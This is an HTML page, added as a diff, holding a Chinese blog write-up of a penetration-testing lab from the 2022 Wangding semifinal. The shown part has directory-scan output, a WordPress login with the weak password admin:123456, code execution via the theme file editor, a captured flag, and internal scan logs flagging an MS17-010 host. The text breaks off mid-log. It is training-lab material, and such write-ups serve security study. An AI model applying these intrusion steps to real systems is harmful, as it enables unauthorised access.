@@ -1,0 +1,920 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fuk.png">
+  <link rel="icon" href="https://img.dkdun.cn/v1/2024/12/83e0272660805f52.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="butt3rf1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AS-REP Roasting、WordPress RCE、RBDC、CVE-2022-26923">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-2022网鼎半决赛复盘">
+<meta property="og:url" content="http://example.com/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="(｡･ω･｡)Welcome~">
+<meta property="og:description" content="AS-REP Roasting、WordPress RCE、RBDC、CVE-2022-26923">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b7cb68187da89cfa.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/1d2dea1744011397.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5873062a9691ad74.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/b4f658f22e455963.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/e5913f930b310363.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/884c3fd0d3eaa369.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/6101b91ad6b199c0.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c71e8ba887d80964.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c843ad6818cb49bd.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/4dbbbd8b908714ac.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/1d9f456723b2fe57.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/9f7196423c7aede4.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/88a7693744a44d75.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d228be69b9e00bb2.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/19796c299b6b0215.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/ad159b4f84bb39b6.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d41095a4440eaf38.png">
+<meta property="article:published_time" content="2025-07-23T10:30:01.000Z">
+<meta property="article:modified_time" content="2025-07-23T16:48:17.240Z">
+<meta property="article:author" content="butt3rf1y">
+<meta property="article:tag" content="内网渗透 WordPress AS-REP Roasting CVE-2022-26923">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/b7cb68187da89cfa.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>春秋云镜-2022网鼎半决赛复盘 - (｡･ω･｡)Welcome~</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>butt3rf1y&#39;s Space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.dkdun.cn/v1/2025/12/ee5d8516e3530463.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜-2022网鼎半决赛复盘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-23 18:30" pubdate>
+          2025年7月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+	<link rel="icon" href="https://img.dkdun.cn/v1/2024/12/e40f2f1a8320e35c.png" type="image/x-icon">
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜-2022网鼎半决赛复盘</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年7月24日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>AS-REP Roasting、WordPress RCE、RBDC、CVE-2022-26923</p>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>无果</p>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>扫到了一堆</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">01:14:02</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0B</span>  - /index.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/</span><br>[<span class="hljs-meta">01:14:04</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">19</span>KB - /license.txt<br>[<span class="hljs-meta">01:14:11</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">7</span>KB - /readme.html<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">317B</span>  - /wp-admin  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-admin/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-content/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">409</span> -    <span class="hljs-number">3</span>KB - /wp-admin/setup-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-admin/install.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-admin/  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?redirect_to=http%3A%2F%2F39.99.132.104%2Fwp-admin%2F&amp;reauth=1</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">319B</span>  - /wp-content  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-content/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">1B</span>  - /wp-admin/admin-ajax.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">69B</span>  - /wp-content/plugins/akismet/akismet.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">0B</span>  - /wp-content/plugins/hello.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-content/uploads/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">777B</span>  - /wp-content/upgrade/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-includes/rss-functions.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /wp-login.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-cron.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-signup.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?action=register</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">320B</span>  - /wp-includes  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-includes/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">54</span>KB - /wp-includes/<br>[<span class="hljs-meta">01:14:19</span>] <span class="hljs-number">405</span> -   <span class="hljs-number">42B</span>  - /xmlrpc.php<br></code></pre></td></tr></table></figure>
+
+<h1 id="WordPress-插件-rce"><a href="#WordPress-插件-rce" class="headerlink" title="WordPress 插件 rce"></a>WordPress 插件 rce</h1><p>wp-admin 能加载，一个 wp 登录框</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b7cb68187da89cfa.png"></p>
+<p>admin:123456 登陆进去，有 theme file editor，直接改 php 文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/1d2dea1744011397.png"></p>
+<p>连上路径</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">132.104</span><span class="hljs-regexp">/wp-admin/</span>theme-editor.php?file=functions.php<br></code></pre></td></tr></table></figure>
+
+<p>在根目录拿到 flag01</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">9</span>a8904be-<span class="hljs-number">64</span>af-<span class="hljs-number">4</span>faa-a667-d6ef0bc0ad64&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><p>传 fscan 扫主机</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[2025-07-19 01:36:07]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:08]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:alive 详情:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">389</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:open 详情:port=<span class="hljs-number">88</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">3306</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:open 详情:port=<span class="hljs-number">22</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:open 详情:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:open 详情:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:hostname=XR-CA, ipv4=<span class="hljs-selector-attr">[172.22.15.18]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:identified 详情:port=<span class="hljs-number">139</span>, domain_name=XIAORANG, workstation_service=XR-<span class="hljs-number">0687</span>, server_service=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:ipv4=<span class="hljs-selector-attr">[172.22.15.13]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-DC01<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[VULN]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:vulnerable 详情:port=<span class="hljs-number">445</span>, vulnerability=MS17-<span class="hljs-number">010</span>, os=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> 状态:identified 详情:ipv4=<span class="hljs-selector-attr">[172.22.15.35]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:service=smb, os=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:hostname=XR-WIN08, ipv4=<span class="hljs-selector-attr">[172.22.15.24]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> 状态:identified 详情:Url=http:<span class="hljs-comment">//172.22.15.26, status_code=200, length=39962, server_info=map[content-type:text/html; charset=UTF-8 date:Fri, 18 Jul 2025 17:36:16 GMT length:39962 link:&lt;http://172.22.15.26/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot; server:Apache/2.4.41 (Ubuntu) status_code:200 title:XIAORANG.LAB vary:Accept-Encoding], fingerprints=[], port=80, service=http, title=XIAORANG.LAB</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:workstation_service=XR-CA, server_service=XR-CA, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">139</span>, computer_name=XR-CA<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, netbios_computer=XR-CA<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> 状态:identified 详情:length=<span class="hljs-number">703</span>, server_info=map<span class="hljs-selector-attr">[accept-ranges:bytes content-length:703 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT etag:<span class="hljs-string">&quot;87cafbaec95d91:0&quot;</span> last-modified:Sat, 03 Jun 2023 07:26:35 GMT length:703 server:Microsoft-IIS/10.0 status_code:200 title:IIS Windows Server]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=IIS Windows Server, Url=http:<span class="hljs-comment">//172.22.15.18, status_code=200</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> 状态:identified 详情:port=<span class="hljs-number">139</span>, computer_name=XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, server_service=XR-DC01, domain_controllers=XIAORANG, netbios_computer=XR-DC01, workstation_service=XR-DC01, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:workstation_service=XR-WIN08, server_service=XR-WIN08, os_version=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>, port=<span class="hljs-number">139</span>, computer_name=XR-WIN08, domain_name=XR-WIN08, netbios_domain=XR-WIN08, netbios_computer=XR-WIN08<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:length=<span class="hljs-number">0</span>, server_info=map<span class="hljs-selector-attr">[content-length:0 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT length:0 location:/www redirect_Url:http://172.22.15.24/www server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 status_code:302 title:无标题 x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=无标题, Url=http:<span class="hljs-comment">//172.22.15.24, status_code=302</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:18]</span> <span class="hljs-selector-attr">[SERVICE]</span> 目标:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 状态:identified 详情:status_code=<span class="hljs-number">200</span>, length=<span class="hljs-number">135</span>, server_info=map<span class="hljs-selector-attr">[cache-control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0 content-type:text/html date:Fri, 18 Jul 2025 17:36:17 GMT expires:Thu, 19 Nov 1981 08:52:00 